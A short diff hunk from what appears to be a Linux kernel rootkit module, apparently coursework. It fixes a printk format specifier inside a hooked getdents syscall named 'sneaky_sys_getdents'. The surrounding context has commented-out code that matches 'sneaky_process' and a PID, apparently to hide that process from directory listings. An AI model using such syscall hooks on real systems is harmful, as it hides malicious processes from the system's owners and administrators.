@@ -72,7 +72,7 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
     for (bpos = 0; bpos < nread;) {
         d = (struct linux_dirent64 *) ((void *)dirp + bpos);
         printk(KERN_INFO"current dirent name: %s \n", dirp->d_name);
-        printk(KERN_INFO"current d_reclen: %s \n", dirp->d_reclen);
+        printk(KERN_INFO"current d_reclen: %d \n", dirp->d_reclen);
         /*
         if (strcmp(dirp->d_name, "sneaky_process") == 0 || strcmp(dirp->d_name, sneaky_pid) == 0) {
             printk(KERN_INFO"find sneaky_process\n");
